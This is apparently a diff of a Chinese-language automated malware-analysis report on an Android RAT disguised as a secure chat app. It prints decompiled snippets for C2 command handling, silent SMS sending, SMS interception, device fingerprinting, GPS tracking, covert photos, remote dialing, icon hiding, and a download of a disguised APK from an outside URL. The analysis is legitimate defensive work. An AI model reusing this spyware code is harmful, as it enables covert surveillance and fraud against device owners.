@@ -6,7 +6,7 @@
     "应用名": "Android Updater",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 313.1
+    "分析耗时(秒)": 418.9
   },
   "行为列表": [
     {
@@ -29,9 +29,9 @@
           "malicious_behavior": "c2_communication",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "public class mnsClnt extends mnsClntLstnr implements mnsCntrlr {\n    byte[] cmd;\n    mnsCnnction conn;\n    mnsCmmndPckt packet;\n    mnsPrcssCmmnd procCmd;\n    Thread readthread;",
-          "malicious_code_snippet_context": "  import java.util.Calendar;\n  \n  /* loaded from: classes.dex */\n>>> public class mnsClnt extends mnsClntLstnr implements mnsCntrlr {\n>>>     byte[] cmd;\n>>>     mnsCnnction conn;\n>>>     private IntentFilter mIntentFilter;\n>>>     private mnsSMSreceiver mSMSreceiver;\n>>>     mnsCmmndPckt packet;\n      mnsPrcssCmmnd procCmd;\n      Thread readthread;\n      public final String TAG = mnsClnt.class.getSimpleName();",
-          "behavior_description": "该类实现了C2控制器接口，内部维护了网络连接对象(conn)、命令数据(packet)、命令处理对象(procCmd)以及读取线程(readthread)，构成了接收和执行远程控制指令的基础架构。",
+          "malicious_code_snippet": "public class mnsClnt extends mnsClntLstnr implements mnsCntrlr {\n    byte[] cmd;\n    mnsCnnction conn;\n    mnsCmmndPckt packet;\n    mnsPrcssCmmnd procCmd;\n    Thread readthread;\n    mnsSMSreceiver mSMSreceiver;\n    int nbAttempts = 10;\n    boolean stop = false;\n}",
+          "malicious_code_snippet_context": "  import java.util.Calendar;\n  \n  /* JADX INFO: loaded from: classes.dex */\n>>> public class mnsClnt extends mnsClntLstnr implements mnsCntrlr {\n>>>     byte[] cmd;\n>>>     mnsCnnction conn;\n>>>     private IntentFilter mIntentFilter;\n>>>     private mnsSMSreceiver mSMSreceiver;\n>>>     mnsCmmndPckt packet;\n>>>     mnsPrcssCmmnd procCmd;\n>>>     Thread readthread;\n>>>     public final String TAG = mnsClnt.class.getSimpleName();\n>>>     int nbAttempts = 10;\n      int elapsedTime = 1;\n      boolean stop = false;\n      boolean isRunning = false;",
+          "behavior_description": "该类是典型的C2远程控制客户端核心组件：通过 mnsCnnction 与远程C2服务器建立持久网络连接，并内置重连机制（nbAttempts=10，失败后按 elapsedTime 递增重试）保证连接存活；readthread 线程持续从socket读取服务器下发的命令数据包（mnsCmmndPckt），存入 cmd 字节缓冲后交由 mnsPrcssCmmnd 解析并执行任意远程命令；同时集成 mnsSMSreceiver 短信监听、mnsSysInfo 系统信息收集、mnsLgPckt 日志包和 mnsPreferencePckt 配置包回传通道，形成'接收C2命令→本地执行→数据回传'的完整远程控制链路。数据流向：C2服务器下发命令(mnsCmmndPckt/socket) → mnsPrcssCmmnd 命令执行；本地短信/系统信息/日志 → mnsCnnction 网络回传至C2服务器。伪装为'chatsecure'安全聊天应用，实为远程控制木马。",
           "glm_analyzed": true
         }
       ]
@@ -78,9 +78,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "if (this.commande == mnsPrtcl.SEND_SMS) {\n    Map<String, String> information = mnsEncdrHlpr.decodeHashMap(this.arguments.array());\n    String num = information.get(mnsPrtcl.KEY_SEND_SMS_NUMBER);\n    String text = information.get(mnsPrtcl.KEY_SEND_SMS_BODY);\n    if (text.getBytes().length < 167) {\n        SmsManager.getDefault().sendTextMessage(num, null, text, null, null);\n    } else {\n        ArrayList<String> multipleMsg = MessageDecoupator(text);\n        SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);\n    }\n}",
-          "malicious_code_snippet_context": "                  this.client.toast.show();\n                  return;\n              }\n>>>             if (this.commande == mnsPrtcl.SEND_SMS) {\n>>>                 this.MyFileHandler = null;\n>>>                 Map<String, String> information = mnsEncdrHlpr.decodeHashMap(this.arguments.array());\n>>>                 String num = information.get(mnsPrtcl.KEY_SEND_SMS_NUMBER);\n>>>                 String text = information.get(mnsPrtcl.KEY_SEND_SMS_BODY);\n>>>                 if (text.getBytes().length < 167) {\n>>>                     SmsManager.getDefault().sendTextMessage(num, null, text, null, null);\n>>>                 } else {\n>>>                     ArrayList<String> multipleMsg = MessageDecoupator(text);\n>>>                     SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);\n>>>                 }\n                  this.client.sendInformation(\"SMS sent\");\n                  try {\n                      Thread.sleep(3000L);",
-          "behavior_description": "代码接收远程C2服务器下发的指令（mnsPrtcl.SEND_SMS），通过 mnsEncdrHlpr.decodeHashMap 解码参数获取短信号码和内容，然后使用 SmsManager 静默发送短信（无用户交互）。发送后查询 content://sms/sent 数据库确认发送结果并回传给C2服务器。这是典型的短信欺诈行为，可被用于发送付费短信造成用户经济损失，或向通讯录联系人发送钓鱼短信进行传播。",
+          "malicious_code_snippet": "if (this.commande == mnsPrtcl.SEND_SMS) {\n    Map<String, String> information = mnsEncdrHlpr.decodeHashMap(this.arguments.array());\n    String num = information.get(mnsPrtcl.KEY_SEND_SMS_NUMBER);\n    String text = information.get(mnsPrtcl.KEY_SEND_SMS_BODY);\n    if (text.getBytes().length < 167) {\n        SmsManager.getDefault().sendTextMessage(num, null, text, null, null);\n    } else {\n        ArrayList<String> multipleMsg = MessageDecoupator(text);\n        SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);\n    }\n    this.client.sendInformation(\"SMS sent\");\n}",
+          "malicious_code_snippet_context": "                  this.client.toast.show();\n                  return;\n              }\n>>>             if (this.commande == mnsPrtcl.SEND_SMS) {\n>>>                 this.MyFileHandler = null;\n>>>                 Map<String, String> information = mnsEncdrHlpr.decodeHashMap(this.arguments.array());\n>>>                 String num = information.get(mnsPrtcl.KEY_SEND_SMS_NUMBER);\n>>>                 String text = information.get(mnsPrtcl.KEY_SEND_SMS_BODY);\n>>>                 if (text.getBytes().length < 167) {\n>>>                     SmsManager.getDefault().sendTextMessage(num, null, text, null, null);\n>>>                 } else {\n>>>                     ArrayList<String> multipleMsg = MessageDecoupator(text);\n>>>                     SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);\n>>>                 }\n>>>                 this.client.sendInformation(\"SMS sent\");\n                  try {\n                      Thread.sleep(3000L);\n                      Uri uriSms = Uri.parse(\"content://sms/sent\");",
+          "behavior_description": "该代码是远程控制木马(RAT)的命令处理模块。攻击者通过C2服务器下发SEND_SMS指令，代码从指令参数中解码出目标号码和短信内容，在用户完全无感知的情况下静默调用SmsManager.sendTextMessage()发送短信（内容超过167字节时自动分段调用sendMultipartTextMessage发送），发送成功后向C2服务器回传'SMS sent'确认，并进一步查询content://sms/sent内容提供器验证发送结果。数据流向：远程C2服务器指令参数→mnsEncdrHlpr.decodeHashMap解码→SmsManager静默发送短信→回执上报C2。该行为可被用于定制短信欺诈、订阅增值扣费业务、向联系人传播钓鱼链接等，直接造成用户经济损失，属于典型的短信欺诈恶意行为。",
           "glm_analyzed": true
         },
         {
@@ -89,9 +89,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "filter.addAction(\"android.provider.Telephony.SMS_RECEIVED\");\nregisterReceiver(this.SMSreceiver, filter);\nfilter2.addAction(\"android.intent.action.PHONE_STATE\");\nregisterReceiver(this.Callreceiver, filter2);",
-          "malicious_code_snippet_context": "  \n      public void registerSMSAndCall() {\n          IntentFilter filter = new IntentFilter();\n>>>         filter.addAction(\"android.provider.Telephony.SMS_RECEIVED\");\n>>>         registerReceiver(this.SMSreceiver, filter);\n>>>         IntentFilter filter2 = new IntentFilter();\n>>>         filter2.addAction(\"android.intent.action.PHONE_STATE\");\n          registerReceiver(this.Callreceiver, filter2);\n      }\n  ",
-          "behavior_description": "该方法注册了两个BroadcastReceiver：一个监听SMS_RECEIVED广播用于拦截所有收到的短信，另一个监听PHONE_STATE用于监控来电状态。在恶意样本中，短信拦截通常用于窃取短信验证码/OTP、隐藏银行通知短信、或对特定号码短信进行静默处理，配合后续的短信上传或指令执行可造成用户财产损失和隐私泄露。",
+          "malicious_code_snippet": "public void registerSMSAndCall() {\n    IntentFilter filter = new IntentFilter();\n    filter.addAction(\"android.provider.Telephony.SMS_RECEIVED\");\n    registerReceiver(this.SMSreceiver, filter);\n    IntentFilter filter2 = new IntentFilter();\n    filter2.addAction(\"android.intent.action.PHONE_STATE\");\n    registerReceiver(this.Callreceiver, filter2);\n}",
+          "malicious_code_snippet_context": "          this.elapsedTime = 1;\n      }\n  \n>>>     public void registerSMSAndCall() {\n>>>         IntentFilter filter = new IntentFilter();\n>>>         filter.addAction(\"android.provider.Telephony.SMS_RECEIVED\");\n>>>         registerReceiver(this.SMSreceiver, filter);\n>>>         IntentFilter filter2 = new IntentFilter();\n>>>         filter2.addAction(\"android.intent.action.PHONE_STATE\");\n>>>         registerReceiver(this.Callreceiver, filter2);\n>>>     }\n  \n      @Override // com.mynetsecure.chatsecure.mnsconnection.mnsCntrlr\n      public void Storage(mnsTrnsprtPckt p, String i) {",
+          "behavior_description": "该方法通过 registerReceiver 动态注册了两个广播接收器：一个监听 android.provider.Telephony.SMS_RECEIVED 广播以拦截所有 incoming 短信，另一个监听 android.intent.action.PHONE_STATE 以监控来电状态和电话号码。数据流向为：系统短信广播(SMS_RECEIVED)→SMSreceiver 接收器拦截短信内容（含验证码、银行通知等敏感信息）→可被窃取、隐藏或上传至远程服务器；同时来电状态信息被 Callreceiver 捕获用于监控通话。该 APK 伪装为安全聊天软件，实际通过拦截短信窃取 OTP 验证码实施短信欺诈，是典型的银行木马/短信拦截恶意行为。",
           "glm_analyzed": true
         }
       ]
@@ -120,7 +120,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "TelephonyManager tm = (TelephonyManager) this.ctx.getSystemService(\"phone\");\nthis.p.setPhoneNumber(tm.getLine1Number());\nthis.p.setIMEI(tm.getDeviceId());\nthis.p.setSoftwareVersion(tm.getDeviceSoftwareVersion());\nthis.p.setCountryCode(tm.getNetworkCountryIso());\nthis.p.setOperatorCode(tm.getNetworkOperator());\nthis.p.setOperatorName(tm.getNetworkOperatorName());\nthis.p.setSimOperatorCode(tm.getSimOperator());\nthis.p.setSimOperatorName(tm.getSimOperatorName());\nthis.p.setSimCountryCode(tm.getSimCountryIso());\nthis.p.setSimSerial(tm.getSimSerialNumber());",
           "malicious_code_snippet_context": "      }\n  \n      public void phoneInfo() {\n>>>         TelephonyManager tm = (TelephonyManager) this.ctx.getSystemService(\"phone\");\n>>>         this.p.setPhoneNumber(tm.getLine1Number());\n>>>         this.p.setIMEI(tm.getDeviceId());\n>>>         this.p.setSoftwareVersion(tm.getDeviceSoftwareVersion());\n>>>         this.p.setCountryCode(tm.getNetworkCountryIso());\n>>>         this.p.setOperatorCode(tm.getNetworkOperator());\n>>>         this.p.setOperatorName(tm.getNetworkOperatorName());\n>>>         this.p.setSimOperatorCode(tm.getSimOperator());\n>>>         this.p.setSimOperatorName(tm.getSimOperatorName());\n>>>         this.p.setSimCountryCode(tm.getSimCountryIso());\n>>>         this.p.setSimSerial(tm.getSimSerialNumber());\n      }\n  \n      public void networkInfo() {",
-          "behavior_description": "通过 TelephonyManager 获取手机号码、IMEI、软件版本、国家代码、运营商信息及SIM序列号等大量设备敏感隐私信息，并将其存储在本地对象中，用于设备指纹采集和后续的隐私窃取。",
+          "behavior_description": "该方法通过 TelephonyManager 系统服务批量采集设备敏感标识与网络信息：手机号、IMEI 设备唯一标识、软件版本、网络国家码、运营商编号/名称、SIM 卡运营商、SIM 国家码及 SIM 序列号，并全部写入内部配置对象 this.p。数据流向为：TelephonyManager.getLine1Number()/getDeviceId()/getSimSerialNumber() 等接口（source）→ this.p.setIMEI()/setSimSerial()/setPhoneNumber() 等本地持久化存储（sink）。结合同类中同时调用的 networkInfo()、androidInfo()、sensorsInfo() 及电池信息广播注册，构成完整的设备指纹画像，用于恶意样本对受害设备进行唯一标识、追踪及后续数据回传，属于隐私窃取行为。",
           "glm_analyzed": true
         }
       ]
@@ -148,7 +148,40 @@
           "risk_level": "高",
           "malicious_code_snippet": "this.mlocManager = (LocationManager) ((Context) locationListener).getSystemService(\"location\");\nthis.mlocManager.requestLocationUpdates(prov, 0L, 0.0f, this.listener);\nthis.packet = new mnsGPSPckt(loc.getLatitude(), loc.getLongitude(), loc.getAltitude(), loc.getSpeed(), loc.getAccuracy());",
           "malicious_code_snippet_context": "          this.listener = locationListener;\n          this.provider = prov;\n          this.channel = chan;\n>>>         this.mlocManager = (LocationManager) ((Context) locationListener).getSystemService(\"location\");\n>>>         this.mlocManager.requestLocationUpdates(prov, 0L, 0.0f, this.listener);\n>>>     }\n  \n      public void stop() {\n          if (this.mlocManager != null) {",
-          "behavior_description": "该代码通过 LocationManager.requestLocationUpdates() 以最小时间间隔(0L)和最小距离(0.0f)持续高频请求GPS位置更新，随后在 encode() 方法中将获取的经度、纬度、海拔、速度、精度等详细位置信息封装为 mnsGPSPckt 数据包，用于后续数据外传。该应用伪装为安全聊天工具(chatsecure)，实际进行隐蔽的位置监控与隐私窃取。",
+          "behavior_description": "该代码是间谍软件的位置追踪模块。构造函数中获取 LocationManager 系统服务，并以最小时间间隔 0 毫秒、最小距离 0.0 米的参数调用 requestLocationUpdates 注册位置监听器，即对受害者进行持续高频的精确定位追踪。随后 encode() 方法将获取的 Location 对象中的纬度、经度、海拔、速度、精度等敏感位置数据打包封装为 mnsGPSPckt 数据包，用于后续通过网络上传至远程服务器，实现隐蔽的位置监控与隐私外传。数据流向：GPS定位数据→mnsGPSPckt数据包封装→（疑似）远程服务器外传。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "DevicePolicyManager"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\mynetsecure\\chatsecure\\MainActivity;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "import android.app.admin.DevicePolicyManager;",
+          "malicious_code_snippet_context": "  import android.annotation.TargetApi;\n  import android.app.Activity;\n  import android.app.DownloadManager;\n>>> import android.app.admin.DevicePolicyManager;\n  import android.content.BroadcastReceiver;\n  import android.content.ComponentName;\n  import android.content.Context;",
+          "behavior_description": "该恶意样本（伪装为'安全聊天'应用chatsecure）的MainActivity引入DevicePolicyManager设备管理API，同时配合ComponentName、BroadcastReceiver等组件用于注册设备管理员。结合malradar确认的勒索软件行为类别，其典型攻击链为：应用诱导或静默激活DeviceAdminReceiver获取设备管理员权限→调用DevicePolicyManager.lockNow()立即锁定屏幕，或resetPassword()重置锁屏密码，使用户被彻底锁在设备之外，进而勒索赎金。数据流向：应用注册设备管理组件获取管理员权限→DevicePolicyManager.lockNow()/resetPassword()锁定设备并篡改锁屏凭据。",
           "glm_analyzed": true
         }
       ]
@@ -176,7 +209,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "SurfaceView view = new SurfaceView(this.ctx);\nthis.holder = view.getHolder();\nthis.cam.setPreviewDisplay(this.holder);\nthis.cam.startPreview();\nthis.cam.takePicture(null, null, this.pic);",
           "malicious_code_snippet_context": "              if (this.cam == null) {\n                  return false;\n              }\n>>>             SurfaceView view = new SurfaceView(this.ctx);\n>>>             try {\n>>>                 this.holder = view.getHolder();\n>>>                 this.cam.setPreviewDisplay(this.holder);\n>>>                 this.cam.startPreview();\n                  this.cam.takePicture(null, null, this.pic);\n                  return true;\n              } catch (IOException e) {",
-          "behavior_description": "代码在后台静默调用摄像头拍照。通过创建一个未添加到任何可见UI的SurfaceView作为虚拟预览载体（满足Camera预览要求但不向用户展示画面），随后调用startPreview()启动预览，再通过takePicture(null, null, this.pic)静默拍摄照片。第一个参数shutter callback为null意味着不触发快门声音，用户完全无感知。拍摄的照片通过pic回调处理，通常后续会被保存并窃取上传至C2服务器。这是典型的间谍软件/监控软件行为，伪装在名为'chatsecure'的包名下以规避怀疑。",
+          "behavior_description": "该代码位于混淆类 mnsPhtTkr（即 PhotoTaker，日志标签也暴露其真实用途），实现隐蔽拍照逻辑：在代码中动态创建一个 SurfaceView 仅作为相机预览的载体（未添加到任何用户可见的界面布局，仅为满足旧版 Android 相机预览要求），随后立即调用 takePicture() 静默拍摄照片，照片数据通过回调 this.pic 接收。这是典型的间谍软件隐蔽拍照模式，用户全程无感知、无任何界面提示。数据流向：摄像头硬件（cam 预览流）→ takePicture() 静默拍照 → pic 回调获取 JPEG 照片数据（通常后续被上传至远程服务器），构成对用户隐私的直接窃取。",
           "glm_analyzed": true
         }
       ]
@@ -211,7 +244,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "if (this.commande == mnsPrtcl.GIVE_CALL) {\n    String uri = \"tel:\" + new String(this.arguments.array());\n    this.intent = new Intent(\"android.intent.action.CALL\", Uri.parse(uri));\n    this.intent.setFlags(268435456);\n    this.client.startActivity(this.intent);\n}",
           "malicious_code_snippet_context": "                      return;\n                  }\n              }\n>>>             if (this.commande == mnsPrtcl.GIVE_CALL) {\n>>>                 this.MyFileHandler = null;\n>>>                 String uri = \"tel:\" + new String(this.arguments.array());\n>>>                 this.intent = new Intent(\"android.intent.action.CALL\", Uri.parse(uri));\n>>>                 this.intent.setFlags(268435456);\n>>>                 this.client.startActivity(this.intent);\n                  return;\n              }\n              if (this.commande == mnsPrtcl.GET_SMS) {",
-          "behavior_description": "代码接收远程C2服务器下发的GIVE_CALL指令及参数，将其拼接为tel: URI，并通过ACTION_CALL意图直接发起电话呼叫，无需用户交互。此行为属于典型的远程控制功能，可导致用户在不知情的情况下被强制拨打恶意或高额收费电话，造成直接经济损失。",
+          "behavior_description": "该代码位于远程控制命令处理器 mnsPrcssCmmnd 中，是典型 RAT 命令分发逻辑。当接收到 C2 服务器下发的 GIVE_CALL 命令时，将命令参数中的电话号码拼接为 tel: URI，并通过 ACTION_CALL Intent 直接发起电话呼叫（ACTION_CALL 会立即拨出，无需用户确认，区别于仅打开拨号界面的 ACTION_DIAL）。数据流向：远程 C2 命令参数(this.arguments.array()) → 拼接 tel: URI → Intent(ACTION_CALL) → startActivity() 静默拨号。攻击者可远程控制受害设备拨打任意号码（如高额付费号码造成资费损失），且同段代码中还存在 GET_SMS 等窃取短信命令，进一步印证其远控木马属性。",
           "glm_analyzed": true
         }
       ]
@@ -239,9 +272,9 @@
           "malicious_behavior": "file_access",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "if (this.commande == mnsPrtcl.LIST_DIR) {\n    String file = new String(this.arguments.array());\n    if (file.equalsIgnoreCase(\"ext\")) {\n        File mnt = new File(\"/storage\");\n        if (!mnt.exists()) {\n            mnt = new File(\"/mnt\");\n        }\n        File[] roots = mnt.listFiles(new FileFilter() {\n            public boolean accept(File pathname) {\n                if (pathname.isDirectory() && pathname.exists() && pathname.canWrite()) {\n                    return !pathname.isHidden();\n                }\n                return false;\n            }\n        });\n    }\n}",
-          "malicious_code_snippet_context": "              }\n              return;\n          }\n>>>         if (this.commande == mnsPrtcl.LIST_DIR) {\n>>>             this.MyFileHandler = null;\n>>>             this.client.sendInformation(\"List directory request received\");\n>>>             String file = new String(this.arguments.array());\n>>>             if (file.equalsIgnoreCase(\"ext\")) {\n>>>                 File mnt = new File(\"/storage\");\n>>>                 if (!mnt.exists()) {\n>>>                     mnt = new File(\"/mnt\");\n>>>                 }\n>>>                 try {\n>>>                     File[] roots = mnt.listFiles(new FileFilter() { // from class: com.mynetsecure.chatsecure.mnsPrcssCmmnd.1\n>>>                         @Override // java.io.FileFilter\n>>>                         public boolean accept(File pathname) {\n>>>                             try {\n>>>                                 if (pathname.isDirectory() && pathname.exists() && pathname.canWrite()) {\n>>>                                     return !pathname.isHidden();\n>>>                                 }\n                                  return false;\n                              } catch (Exception e4) {\n                                  return false;",
-          "behavior_description": "该代码属于远程命令处理类mnsPrcssCmmnd，接收来自C2服务器的LIST_DIR指令，遍历设备/storage或/mnt目录，筛选出可写的非隐藏目录。这是远程控制木马典型的文件系统侦察行为，为后续文件窃取或勒索加密做准备。数据流向：远程指令(this.commande/this.arguments)→文件系统枚举(File.listFiles)",
+          "malicious_code_snippet": "if (this.commande == mnsPrtcl.LIST_DIR) {\n    String file = new String(this.arguments.array());\n    if (file.equalsIgnoreCase(\"ext\")) {\n        File mnt = new File(\"/storage\");\n        if (!mnt.exists()) {\n            mnt = new File(\"/mnt\");\n        }\n        File[] roots = mnt.listFiles(new FileFilter() {\n            public boolean accept(File pathname) {\n                return pathname.isDirectory() && pathname.exists() && pathname.canWrite() && !pathname.isHidden();\n            }\n        });\n        for (File ff : roots) {\n            ...\n        }\n    }\n}",
+          "malicious_code_snippet_context": "              }\n              return;\n          }\n>>>         if (this.commande == mnsPrtcl.LIST_DIR) {\n>>>             this.MyFileHandler = null;\n>>>             this.client.sendInformation(\"List directory request received\");\n>>>             String file = new String(this.arguments.array());\n>>>             if (file.equalsIgnoreCase(\"ext\")) {\n>>>                 File mnt = new File(\"/storage\");\n>>>                 if (!mnt.exists()) {\n>>>                     mnt = new File(\"/mnt\");\n>>>                 }\n>>>                 try {\n>>>                     File[] roots = mnt.listFiles(new FileFilter() { // from class: com.mynetsecure.chatsecure.mnsPrcssCmmnd.1\n>>>                         @Override // java.io.FileFilter\n>>>                         public boolean accept(File pathname) {\n>>>                             try {\n>>>                                 return pathname.isDirectory() && pathname.exists() && pathname.canWrite() && !pathname.isHidden();\n>>>                             } catch (Exception e4) {\n>>>                                 return false;\n                              }\n                          }\n                      });",
+          "behavior_description": "该代码位于远程控制木马(RAT)的命令处理类 mnsPrcssCmmnd 中，接收远程C2服务器下发的 LIST_DIR 指令及参数，枚举设备 /storage（不存在则回退到 /mnt）下所有存在且可写的非隐藏目录，并遍历目录列表（后续大概率将结果回传给远端服务器）。数据流向：远程服务器命令→本地文件系统枚举→目录结构回传，属于远程文件浏览/窃取链路的前置侦察步骤，为攻击者后续遍历并窃取用户文件（照片、文档等）提供能力。",
           "glm_analyzed": true
         }
       ]
@@ -265,9 +298,9 @@
           "malicious_behavior": "icon_hiding",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "PackageManager p = getPackageManager();\nComponentName componentName = new ComponentName(BuildConfig.APPLICATION_ID, \"com.mynetsecure.chatsecure.MainActivity\");\np.setComponentEnabledSetting(componentName, 2, 1);",
-          "malicious_code_snippet_context": "          this.Client.setAction(MainActivity.class.getName());\n          startService(this.Client);\n          try {\n>>>             PackageManager p = getPackageManager();\n>>>             ComponentName componentName = new ComponentName(BuildConfig.APPLICATION_ID, \"com.mynetsecure.chatsecure.MainActivity\");\n>>>             p.setComponentEnabledSetting(componentName, 2, 1);\n          } catch (Exception e2) {\n          }\n          StartDownload(\"http://android.nard.ca/wp-content/uploads/2016/social_media/SnapChat1.apk\", \"SnapChat\", \"SnapChat.apk\");",
-          "behavior_description": "代码通过PackageManager.setComponentEnabledSetting()将MainActivity组件设置为禁用状态（COMPONENT_ENABLED_STATE_DISABLED=2），使应用图标从启动器中消失，用户无法察觉应用的存在。同时代码还尝试通过su命令获取root权限、静默下载第三方APK（SnapChat.apk）并注册BroadcastReceiver在下载完成后获取DevicePolicyManager设备管理器权限，属于典型的恶意软件潜伏与持久化行为。",
+          "malicious_code_snippet": "PackageManager p = getPackageManager();\nComponentName componentName = new ComponentName(BuildConfig.APPLICATION_ID, \"com.mynetsecure.chatsecure.MainActivity\");\np.setComponentEnabledSetting(componentName, 2, 1);\nStartDownload(\"http://android.nard.ca/wp-content/uploads/2016/social_media/SnapChat1.apk\", \"SnapChat\", \"SnapChat.apk\");",
+          "malicious_code_snippet_context": "          this.Client.setAction(MainActivity.class.getName());\n          startService(this.Client);\n          try {\n>>>             PackageManager p = getPackageManager();\n>>>             ComponentName componentName = new ComponentName(BuildConfig.APPLICATION_ID, \"com.mynetsecure.chatsecure.MainActivity\");\n>>>             p.setComponentEnabledSetting(componentName, 2, 1);\n>>>         } catch (Exception e2) {\n          }\n          StartDownload(\"http://android.nard.ca/wp-content/uploads/2016/social_media/SnapChat1.apk\", \"SnapChat\", \"SnapChat.apk\");\n          BroadcastReceiver onComplete = new BroadcastReceiver() { // from class: com.mynetsecure.chatsecure.MainActivity.1",
+          "behavior_description": "应用在 onCreate 启动后台服务 mnsClnt 后，通过 PackageManager 获取自身 MainActivity 的 ComponentName（数据来源：BuildConfig.APPLICATION_ID + 硬编码类名），调用 setComponentEnabledSetting 将该组件设置为 COMPONENT_ENABLED_STATE_DISABLED(2)，导致应用图标从桌面启动器中消失，实现自我隐藏以逃避用户察觉与卸载；随后从远程服务器静默下载伪装成 SnapChat 的 APK，并通过 BroadcastReceiver 尝试激活设备管理器权限以增强持久化，属于典型的投放器隐蔽驻留行为",
           "glm_analyzed": true
         }
       ]
@@ -280,7 +313,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
